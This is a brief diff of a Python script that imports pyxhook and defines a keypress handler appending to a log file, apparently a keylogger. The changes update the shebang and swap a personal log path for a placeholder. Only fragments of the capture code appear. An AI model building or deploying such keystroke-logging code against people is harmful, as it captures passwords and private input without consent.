@@ -1,4 +1,5 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
+
 
 import pyxhook
 
@@ -19,7 +20,7 @@ import pyxhook
 
 
 
-log_file='/home/virus06t/Desktop/file.log'
+log_file='/path/..'
 
 def keypress(event):
 	log=open(log_file,'a')
